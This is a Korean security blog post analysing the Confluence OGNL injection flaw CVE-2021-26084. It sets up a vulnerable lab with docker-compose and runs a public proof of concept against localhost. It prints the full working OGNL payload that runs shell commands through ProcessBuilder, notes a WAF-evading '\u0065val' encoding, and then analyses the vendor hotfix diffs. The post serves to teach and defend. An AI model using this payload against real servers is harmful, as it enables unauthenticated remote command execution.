<!doctype html><html lang=kr><meta charset=utf-8>
<meta name=viewport content="width=device-width">
<title>컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) | 데구루루x2 놀이터</title>
<meta name=generator content="Hugo Eureka 0.8.2">
<link rel=stylesheet href=/css/eureka.min.css>
<script defer src=/js/eureka.min.js></script>
<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
<link rel=preload href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" as=style onload="this.onload=null,this.rel='stylesheet'">
<link rel=stylesheet href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/solarized-light.min.css media=print onload="this.media='all',this.onload=null" crossorigin>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/highlight.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/languages/dart.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/js/all.min.js integrity="sha256-uNYoXefWRqv+PsIF/OflNmwtKM4lStn9yrz2gVl6ymo=" crossorigin></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X media=print onload="this.media='all',this.onload=null" crossorigin>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
<script defer src=https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js integrity="sha256-Zmpaaj+GXFsPF5WdPArSrnW3b30dovldeKsW00xBVwE=" crossorigin></script>
<link rel=preconnect href=https://www.google-analytics.com crossorigin>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-164568875-1"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-164568875-1')</script>
<link rel=icon type=image/png sizes=32x32 href=/images/deguru22_hufc063740f6f81162e489d60dbe402c0f_388931_32x32_fill_q75_box_center.jpg>
<link rel=apple-touch-icon sizes=180x180 href=/images/deguru22_hufc063740f6f81162e489d60dbe402c0f_388931_180x180_fill_q75_box_center.jpg>
<meta name=description content="CVE-2021-26084 컨플루언스 원격 명령 실행 취약점 분석">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"/kr/posts/"},{"@type":"ListItem","position":2,"name":"컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)","item":"/kr/2021/09/05/%EC%BB%A8%ED%94%8C%EB%A3%A8%EC%96%B8%EC%8A%A4-ognl-injection-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-cve-2021-26084/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"/kr/2021/09/05/%EC%BB%A8%ED%94%8C%EB%A3%A8%EC%96%B8%EC%8A%A4-ognl-injection-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-cve-2021-26084/"},"headline":"컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) | 데구루루x2 놀이터","datePublished":"2021-09-05T23:49:36+09:00","dateModified":"2021-09-05T23:49:36+09:00","wordCount":2835,"publisher":{"@type":"Person","name":"deguru22","logo":{"@type":"ImageObject","url":"/images/deguru22.jpg"}},"description":"CVE-2021-26084 컨플루언스 원격 명령 실행 취약점 분석"}</script><meta property="og:title" content="컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) | 데구루루x2 놀이터">
<meta property="og:type" content="article">
<meta property="og:image" content="/images/deguru22.jpg">
<meta property="og:url" content="/kr/2021/09/05/%EC%BB%A8%ED%94%8C%EB%A3%A8%EC%96%B8%EC%8A%A4-ognl-injection-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-cve-2021-26084/">
<meta property="og:description" content="CVE-2021-26084 컨플루언스 원격 명령 실행 취약점 분석">
<meta property="og:locale" content="kr">
<meta property="og:site_name" content="데구루루x2 놀이터">
<meta property="article:published_time" content="2021-09-05T23:49:36+09:00">
<meta property="article:modified_time" content="2021-09-05T23:49:36+09:00">
<meta property="article:section" content="posts">
<body class="flex flex-col min-h-screen">
<header class="fixed flex items-center w-full min-h-16 pl-scrollbar z-50 bg-secondary-bg shadow-sm">
<div class="w-full max-w-screen-xl mx-auto"><script>let storageColorScheme=localStorage.getItem("lightDarkMode");((storageColorScheme=='Auto'||storageColorScheme==null)&&window.matchMedia("(prefers-color-scheme: dark)").matches||storageColorScheme=="Dark")&&document.getElementsByTagName('html')[0].classList.add('dark')</script>
<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
<a href=/kr class="mr-6 text-primary-text text-xl font-bold">데구루루x2 놀이터</a>
<button id=navbar-btn class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
<i class="fas fa-bars"></i>
</button>
<div id=target class="hidden block md:flex md:flex-grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
<div class="md:flex md:h-16 text-sm md:flex-grow pb-4 md:pb-0 border-b md:border-b-0">
<a href=/kr/#about class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">About</a>
<a href=/kr/posts/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Posts</a>
</div>
<div class=flex>
<div class="relative pt-4 md:pt-0">
<div class="cursor-pointer hover:text-eureka" id=lightDarkMode>
<i class="fas fa-adjust"></i>
</div>
<div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id=is-open>
</div>
<div class="absolute flex flex-col left-0 md:left-auto right-auto md:right-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40" id=lightDarkOptions>
<span class="px-4 py-1 hover:text-eureka" name=Light></span>
<span class="px-4 py-1 hover:text-eureka" name=Dark></span>
<span class="px-4 py-1 hover:text-eureka" name=Auto></span>
</div>
</div>
</div>
</div>
<div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id=is-open-mobile>
</div>
</nav>
<script>let element=document.getElementById('lightDarkMode');storageColorScheme==null||storageColorScheme=='Auto'?document.addEventListener('DOMContentLoaded',()=>{window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change',switchDarkMode)}):storageColorScheme=="Light"?(element.firstElementChild.classList.remove('fa-adjust'),element.firstElementChild.setAttribute("data-icon",'sun'),element.firstElementChild.classList.add('fa-sun')):storageColorScheme=="Dark"&&(element.firstElementChild.classList.remove('fa-adjust'),element.firstElementChild.setAttribute("data-icon",'moon'),element.firstElementChild.classList.add('fa-moon')),document.addEventListener('DOMContentLoaded',()=>{getcolorscheme(),switchBurger()})</script>
</div>
</header>
<main class="flex-grow pt-16">
<div class=pl-scrollbar>
<div class="w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto">
<div class="grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12">
<div class="col-span-2 lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
<h1 class="font-bold text-3xl text-primary-text">컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)</h1>
<div class="flex flex-wrap flex-row items-center mt-2 text-tertiary-text">
<div class="mr-6 my-2">
<i class="fas fa-calendar mr-1"></i>
<span>2021-09-05</span>
</div>
<div class="mr-6 my-2">
<i class="fas fa-clock mr-1"></i>
<span></span>
</div>
<div class="mr-6 my-2">
<i class="fas fa-folder mr-1"></i>
<a href=/kr/categories/cve/ class=hover:text-eureka>CVE</a>
<span>, </span>
<a href=/kr/categories/confluence/ class=hover:text-eureka>Confluence</a>
<span>, </span>
<a href=/kr/categories/rce/ class=hover:text-eureka>RCE</a>
</div>
</div>
<div class=content>
<h2 id=요약>요약</h2>
<ul>
<li>
<p>컨플루언스에서 <strong>권한 없이 원격 명령 실행</strong> 가능한 취약점 발생, 해당 취약점 패치 배포 완료 (2021-08-25)</p>
</li>
<li>
<p>OGNL(Object Graph Navigation Language) 취약점을 이용한 것으로, 이전에 발견된 Apache Struts2 (CVE-2017-5638)과 유사한 취약점. Velocity 지시자 파라미터는 <code>=</code> 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생함</p>
</li>
<li>
<p>해당 취약점을 활용한 exploit code가 공개되어있고, 권한 없는 사용자도 원격 실행이 가능하므로 빠른 패치가 필요함</p>
</li>
</ul>
<h2 id=이-문서에서는-아래-내용을-다룹니다>이 문서에서는 아래 내용을 다룹니다</h2>
<ul>
<li>
<p>docker-compose 를 통한 취약점 재현 환경 설정 및 실습</p>
</li>
<li>
<p>공개된 exploit code 분석</p>
</li>
<li>
<p>실제 패치 내용 분석</p>
</li>
</ul>
<h2 id=취약점-정보>취약점 정보</h2>
<ul>
<li>공식 Advisory : <a href=https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html>Confluence Security Advisory 2021-08-25</a></li>
</ul>
<h3 id=버전-정보>버전 정보</h3>
<ul>
<li>패치 완료된 버전 : 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0</li>
</ul>
<h3 id=취약한-url-및-파라미터>취약한 URL 및 파라미터</h3>
<table>
<thead>
<tr>
<th>URL</th>
<th>파라미터</th>
<th>로그인 하지 않고 공격 가능</th>
<th>비고</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>/pages/createpage-entervariables</strong></td>
<td>querystring</td>
<td>O</td>
<td>로그인 없이 가능</td>
</tr>
<tr>
<td><strong>/login.action</strong></td>
<td>token</td>
<td>△</td>
<td>회원 가입이 활성화 되어 있어야 함 (기본 비활성화)</td>
</tr>
<tr>
<td>/users/user-dark-features</td>
<td>featureKey</td>
<td>X</td>
<td>추가 기능 사용을 위한 페이지, 관리자의 허용 설정 필요</td>
</tr>
<tr>
<td>/pages/templates2/viewpagetemplate.action</td>
<td>querystring, linkCreation</td>
<td>X</td>
<td></td>
</tr>
<tr>
<td>/templates/editor-preload-containers</td>
<td>syncRev</td>
<td>X</td>
<td></td>
</tr>
<tr>
<td>/template/custom/content-editor</td>
<td>sourceTemplateId*</td>
<td>X</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id=공개된-poc>공개된 PoC</h3>
<ul>
<li>
<p><a href=https://github.com/h3v0x/CVE-2021-26084_Confluence>h3v0x/CVE-2021-26084_Confluence</a></p>
</li>
<li>
<p><a href=https://github.com/alt3kx/CVE-2021-26084_PoC>alt3kx/CVE-2021-26084_POC</a></p>
</li>
</ul>
<h2 id=취약점-실습-환경-구성>취약점 실습 환경 구성</h2>
<h3 id=취약한-버전-컨플루언스-구동>취약한 버전 컨플루언스 구동</h3>
<p>docker-compose를 활용해서 컨플루언스를 구동해 봅시다. docker-compose 사용을 위해서는 <a href=https://www.docker.com/products/docker-desktop>docker desktop</a> 설치가 필요합니다. 이 튜토리얼에서는 취약한 버전 <code>7.12.4</code> 버전을 기준으로 합니다.</p>
<h4 id=docker-composeyml><strong><code>docker-compose.yml</code></strong></h4>
<pre><code class=language-yml>version: '3'
services:
  confluence:
    image: atlassian/confluence-server:7.12.4
    environment:
      - ATL_JDBC_URL=jdbc:postgresql://db:5432/confluence
      - ATL_JDBC_USER=confluence
      - ATL_JDBC_PASSWORD=donotuseinproduction
      - ATL_DB_DRIVER=org.postgresql.Driver
      - ATL_DB_TYPE=postgresql
    ports:
      - 8090:8090
    depends_on:
      - db
    restart: always

  db:
    image: postgres:11
    environment:
      - POSTGRES_PASSWORD=donotuseinproduction
      - POSTGRES_USER=confluence
      - POSTGRES_DB=confluence
    restart: always
</code></pre>
<p>위의 compose 파일 생성 후 아래 명령어로 confluence를 실행해 줍니다.</p>
<pre><code class=language-bash>$ docker-compose up
</code></pre>
<p>실행 후에 Trial license를 등록하고, 아래쪽에 버전 정보가 취약한 버전임을 확인합니다.</p>
<h2 id=poc-실습>PoC 실습</h2>
<h3 id=실행해-보기>실행해 보기</h3>
<p>실행할 PoC는 <a href=https://github.com/h3v0x/CVE-2021-26084_Confluence>h3v0x/CVE-2021-26084_Confluence</a> 입니다.</p>
<p>해당 PoC 코드를 실행하기 위해서는 공격 대상 페이지 URL 정보를 입력해야 합니다. 우리는 완전한 외부자인 것을 가정하고 공격하기 위해서, <code>/pages/createpage-entervariables.action?SpaceKey=x</code> 페이지를 활용해 봅시다.</p>
<p>우선 (1) 해당 페이지에 접근이 가능한지, (2) 실제 접근 시 SpaceKey 파라미터 내의 값이 응답값에 포함되는지 확인해 봅시다.</p>
<p>해당 페이지에 URL 직접접근을 할 경우, 로그인 하지 않았음에도 불구하고 에디터 창이 뜹니다. 디폴트 세팅 시 로그인한 사용자만 컨플루언스의 기능을 사용할 수 있기 때문에 다른 페이지의 경우 비로그인 상태로 접근 시 로그인 화면으로 즉시 리다이렉트 되는데, 특이한 페이지 인 것 같습니다.
<img src=https://user-images.githubusercontent.com/89086864/132701074-bae177aa-2a6c-48ed-9c93-75e373325d47.png alt=error></p>
<p>SpaceKey를 통해 넘긴 파라미터가 응답값 내 querystring에 <code>SpaceKey=deguru</code>로 출력되는것을 확인할 수 있습니다.
<img src=https://user-images.githubusercontent.com/89086864/132702673-480fe6d7-ba99-409a-9cf6-0470f50506eb.png alt=reflect></p>
<p>세팅은 다 된것 같으니, 한번 PoC 코드를 실행시켜 봅시다. 명령 실행이 잘 되는 것을 확인할 수 있습니다.</p>
<pre><code>$ python3 Confluence_OGNLInjection.py -u http://127.0.0.1:8090 -p /pages/createpage-entervariables.action?SpaceKey=x
--------------------------------------------------------------
[-] Confluence Server Webwork OGNL injection
[-] CVE-2021-26084
[-] https://github.com/h3v0x
---------------------------------------------------------------

&gt; whoami
aaaaaaaa[confluence
]
&gt;

</code></pre>
<h2 id=poc-코드-분석>PoC 코드 분석</h2>
<p><a href=https://raw.githubusercontent.com/h3v0x/CVE-2021-26084_Confluence/main/Confluence_OGNLInjection.py>PoC 코드</a>는 매우 단순합니다. 우리가 입력한 URL에 실행할 명령어를 queryString 파라미터로 포함한 요청을 보내고 -> 응답값 내의 명령 실행 결과를 파싱하여 우리에게 보여줍니다. 웹서버 권한으로 모든 명령 실행이 가능합니다.</p>
<p>명령 실행을 위해 서버측에 보낸 코드는 아래와 같습니다.</p>
<pre><code>xpl_data = {&quot;queryString&quot;: &quot;aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022&quot;+cmd+&quot;\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027&quot;}
</code></pre>
<p>해당 코드를 조각내어 분석해 봅시다. 첫번째 코드 조각은, 명령 실행 시 서버 환경 확인 및 윈도우의 경우 cmd.exe, 그 외의 경우 bash 를 활용하여 명령 실행 할 수 있도록 서버의 실행 환경을 확인하는 코드입니다.</p>
<p>추가적으로, 코드 작성 시 자바 코드를 자바스크립트 문법으로 사용할 수 있도록 도와주는 ScriptEngineManager를 활용 하였습니다. 컨플루언스에 적용되어있는 시큐어 코딩 방식은 특정 프로퍼티, 메소드 등을 블랙리스트로 탐지하는 방식이여서 new String[]을 입력할 수 없습니다. 그러므로 명령 실행을 위한 명령어를 변수로 설정하는 것이 불가능하고, 따라서 명령 실행이 불가능 합니다. 이러한 제약사항을 ScriptEngineManager를 활용하여 우회합니다.</p>
<blockquote>
<p>❗ 원본 코드에는 <code>.eval</code> 부분이 <code>.\\u0065val</code> 식으로 인코딩 되어 있어 (1) 인코딩 상태와 (2) 인코딩 되지 않은 상태 두가지 다 테스트 해 본 결과, 인코딩이 되어 있어도 정상적으로 <code>.eval</code> 형태로 인식하는 것을 확인 했습니다.</p>
</blockquote>
<blockquote>
<p><code>.eval</code>로 작성해도 정상적으로 인식 함에도 불구하고 왜 이런 방식으로 작성해 두었는지 궁금했는데, 관련된 흥미로운 글을 발견했습니다.</p>
</blockquote>
<blockquote>
<p>요약) VMWare에 취약점 제보를 위해 제공했던 익스플로잇 코드가 github 내 공개 레포지토리인 Nuclei template 의 <a href=https://github.com/projectdiscovery/nuclei-templates/pull/2529/commits/f1f5add7971078c239c9862c361f834fa9bdbb61>pull request</a>에 등록 되어 공격 페이로드가 외부 공개 되었다는 주장입니다.</p>
</blockquote>
<blockquote>
<p>상세) VMWare에 접수한 익스플로잇 코드는 VMWare 사에 적용되어있는 WAF를 우회하기 위하여 <code>eval</code>이 아닌 <code>\\u0065val</code>로 설정해 두었고, 명령 실행 결과를 구분하기 위하여 <code>aaaaaaaaa[실행결과]</code> 형태로 결과물을 출력해 주는것이 특징입니다. 해당 pull request 내에 사용된 공격 payload는 익스플로잇 코드 유출을 주장하는 사용자가 VMWare에 접수한 코드와 동일합니다. 또한 이 게시물에서 다루는 <a href=https://raw.githubusercontent.com/h3v0x/CVE-2021-26084_Confluence/main/Confluence_OGNLInjection.py>PoC 코드</a>와도 동일합니다. 해당 글 작성자는 2021년 8월 31일 오전 10:39 (UTC+7)에 VMWare에 티켓을 접수하였고, 위의 pull request는 2021년 9월 1일 오전 3:44(UTC+7)에 올라왔습니다.</p>
</blockquote>
<blockquote>
<p>원문) <a href=https://tradahacking.vn/atlassian-confluence-cve-2021-26084-the-other-side-of-bug-bounty-45ed19c814f6>[Atlassian Confluence CVE-2021–26084]::: The other side of bug report!</a></p>
</blockquote>
<pre><code>Class.forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'JavaScript\').eval(\'var isWin = java.lang.System.getProperty(\&quot;os.name\&quot;).toLowerCase().contains(\&quot;win\&quot;);

var cmd = new java.lang.String(\&quot;&quot;+cmd+&quot;\&quot;);
var p = new java.lang.ProcessBuilder();

if(isWin){p.command(\&quot;cmd.exe\&quot;, \&quot;/c\&quot;, cmd); }
else{p.command(\&quot;bash\&quot;, \&quot;-c\&quot;, cmd); }
p.redirectErrorStream(true);
</code></pre>
<p>명령 실행을 위한 세팅이 끝나면, 실제 환경에 맞는 실행 명령 전달을 통해 명령 실행 및 결과를 출력 합니다.</p>
<pre><code>var process= p.start();
var inputStreamReader = new java.io.InputStreamReader(process.getInputStream());
var bufferedReader = new java.io.BufferedReader(inputStreamReader);
var line = \&quot;\&quot;;
var output = \&quot;\&quot;;
while((line = bufferedReader.readLine()) != null){
  output = output + line + java.lang.Character.toString(10);
}\')}+\'
</code></pre>
<h2 id=실제-패치-내용-분석>실제 패치 내용 분석</h2>
<p>아틀라시안에서는 해당 취약점 패치를 위한 <a href=https://confluence.atlassian.com/doc/files/1077906215/1077916296/2/1629936383093/cve-2021-26084-update.sh>핫픽스</a>를 공개 하였습니다. 패치를 적용한 후 패치 내용을 분석해 봅니다. 중요한 내용 위주로 보겠습니다.</p>
<p>File 1(confluence/users/user-dark-features.vm)과 File 2(confluence/login.vm)에는 변동사항이 없습니다.</p>
<pre><code>File 1: 'confluence/users/user-dark-features.vm':
   a. backing up file.. done
   b. updating file.. done
   c. showing file changes..
   d. validating file changes.. ok
   e. file updated successfully!

File 2: 'confluence/login.vm':
   a. backing up file.. done
   b. updating file.. done
   c. showing file changes..
   d. validating file changes.. ok
   e. file updated successfully!
</code></pre>
<p>File 3의 경우는 일부 변경사항이 있습니다. 기존의 <code>$!queryString</code> 에서 <code>queryString</code>으로 변경됐습니다. <code>linkCreation</code>도 마찬가지로 <code>$</code>가 빠졌습니다. Velocity의 지시자 파라미터로 처리되지 않도록 변경된 것입니다. Velocity의 지시자 파라미터는 <code>=</code> 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생하는 취약점으로 보입니다.</p>
<pre><code>File 3: 'confluence/pages/createpage-entervariables.vm':
   a. backing up file.. done
   b. updating file.. done
   c. showing file changes..
24c24
&lt;                 #tag (&quot;Hidden&quot; &quot;name='queryString'&quot; &quot;value='$!queryString'&quot;)
---
&gt;                 #tag (&quot;Hidden&quot; &quot;name='queryString'&quot; &quot;value=queryString&quot;)
26c26
&lt;                 #tag (&quot;Hidden&quot; &quot;name='linkCreation'&quot; &quot;value='$linkCreation'&quot;)
---
&gt;                 #tag (&quot;Hidden&quot; &quot;name='linkCreation'&quot; &quot;value=linkCreation&quot;)
   d. validating file changes..ok
   e. file updated successfully!
</code></pre>
<p>File 4(content-editor.vm)와 5(confluence-editor-loader*.jar)도 마찬가지로 입력값이 변수 처리 되지 않도록 패치 되었습니다.</p>
<pre><code>File 4: 'confluence/template/custom/content-editor.vm':
   a. backing up file.. done
   b. updating file.. done
   c. showing file changes..
64c64
&lt;         #tag (&quot;Hidden&quot; &quot;name='queryString'&quot; &quot;value='$!queryString'&quot;)
---
&gt;         #tag (&quot;Hidden&quot; &quot;name='queryString'&quot; &quot;value=queryString&quot;)
85c85
&lt;             #tag (&quot;Hidden&quot; &quot;id=sourceTemplateId&quot; &quot;name='sourceTemplateId'&quot; &quot;value='${templateId}'&quot;)
---
&gt;             #tag (&quot;Hidden&quot; &quot;id=sourceTemplateId&quot; &quot;name='sourceTemplateId'&quot; &quot;value=templateId&quot;)
   d. file updated successfully!

File 5: 'confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader*.jar':
   a. extracting templates/editor-preload-container.vm from confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar..
Archive:  confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar
  inflating: ./templates/editor-preload-container.vm
   b. updating file.. done
   c. showing file changes..
56c56
&lt; #tag (&quot;Hidden&quot; &quot;id=syncRev&quot; &quot;name='syncRev'&quot; &quot;value='$!{action.syncRev}'&quot;)
---
&gt; #tag (&quot;Hidden&quot; &quot;id=syncRev&quot; &quot;name='syncRev'&quot; &quot;value=syncRev&quot;)
   d. validating file changes.. ok
   e. updating confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar with ./templates/editor-preload-container.vm..updating: templates/editor-preload-container.vm (deflated 59%)
-rw-r--r--  1 ...  ....  13370 Sep  9 23:52 confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar
   f. cleaning up temp files..ok
   g. extracting templates/editor-preload-container.vm from confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar again to check changes within JAR..
...skipping...
</code></pre>
<p>완료 후 PoC를 재실행 해 보면 아래와 같이 명령어가 해석되지 않고 그대로 출력되는 것을 확인할 수 있습니다.</p>
<pre><code>❯ python3 Confluence_OGNLInjection.py -u http://127.0.0.1:8090 -p &quot;/pages/createpage-entervariables.action?SpaceKey=deguru&quot;
---------------------------------------------------------------
[-] Confluence Server Webwork OGNL injection
[-] CVE-2021-26084
[-] https://github.com/h3v0x
---------------------------------------------------------------

&gt; whoami
aaaaaaaa\u0027+{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var isWin = java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022); var cmd = new java.lang.String(\u0022whoami\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\u0022cmd.exe\u0022, \u0022/c\u0022, cmd); } else{p.command(\u0022bash\u0022, \u0022-c\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \u0022\u0022; var output = \u0022\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\u0027)}+\u0027
</code></pre>
<h2 id=결론>결론</h2>
<ul>
<li>컨플루언스를 쓴다면, 최신버전으로 업데이트 하거나 핫픽스가 반드시 필요합니다.</li>
</ul>
<h2 id=references>References</h2>
<ul>
<li><a href=https://github.com/h3v0x/CVE-2021-26084_Confluence>https://github.com/h3v0x/CVE-2021-26084_Confluence</a></li>
<li><a href=https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md>https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</a></li>
<li><a href=https://velocity.apache.org/engine/2.3/vtl-reference.html#variables>https://velocity.apache.org/engine/2.3/vtl-reference.html#variables</a></li>
<li><a href=https://twitter.com/pwntester/status/1433888277946372109>https://twitter.com/pwntester/status/1433888277946372109</a></li>
</ul>
</div>
<div class="flex flex-col md:flex-row md:justify-between -mx-2 mt-4 px-2 pt-4 border-t">
<div>
</div>
<div class="md:text-right mt-4 md:mt-0">
<span class="block font-bold"></span>
<a href=/kr/2021/08/30/arm-%EC%96%B4%EC%85%88%EB%B8%94%EB%A6%AC-%ED%8A%9C%ED%86%A0%EB%A6%AC%EC%96%BC-3-arm-thumb/ class=block>ARM 어셈블리 튜토리얼 (3) ARM & Thumb</a>
</div>
</div>
<div id=disqus_thread></div>
<script>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//deguru22-notes.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<div class=col-span-2>
<div class="sticky top-16 z-10 hidden lg:block px-6 py-4 bg-primary-bg">
<span class="text-lg font-semibold"></span>
</div>
<div class="sticky-toc hidden lg:block px-6 pb-6">
<nav id=TableOfContents>
<ul>
<li><a href=#요약>요약</a></li>
<li><a href=#이-문서에서는-아래-내용을-다룹니다>이 문서에서는 아래 내용을 다룹니다</a></li>
<li><a href=#취약점-정보>취약점 정보</a>
<ul>
<li><a href=#버전-정보>버전 정보</a></li>
<li><a href=#취약한-url-및-파라미터>취약한 URL 및 파라미터</a></li>
<li><a href=#공개된-poc>공개된 PoC</a></li>
</ul>
</li>
<li><a href=#취약점-실습-환경-구성>취약점 실습 환경 구성</a>
<ul>
<li><a href=#취약한-버전-컨플루언스-구동>취약한 버전 컨플루언스 구동</a>
<ul>
<li><a href=#docker-composeyml><strong><code>docker-compose.yml</code></strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href=#poc-실습>PoC 실습</a>
<ul>
<li><a href=#실행해-보기>실행해 보기</a></li>
</ul>
</li>
<li><a href=#poc-코드-분석>PoC 코드 분석</a></li>
<li><a href=#실제-패치-내용-분석>실제 패치 내용 분석</a></li>
<li><a href=#결론>결론</a></li>
<li><a href=#references>References</a></li>
</ul>
</nav>
</div>
<script>window.addEventListener('DOMContentLoaded',()=>{enableStickyToc()})</script>
</div>
</div>
<script>document.addEventListener('DOMContentLoaded',()=>{hljs.initHighlightingOnLoad()})</script>
</div>
</div>
</main>
<footer class=pl-scrollbar>
<div class="w-full max-w-screen-xl mx-auto"><div class="text-center p-6 pin-b">
<p class="text-sm text-tertiary-text">&copy; 2021 deguru22
&#183; Powered by the <a href=https://github.com/wangchucheng/hugo-eureka class=hover:text-eureka>Eureka</a> theme for <a href=https://gohugo.io class=hover:text-eureka>Hugo</a></p>
</div></div>
</footer>
</body>
</html>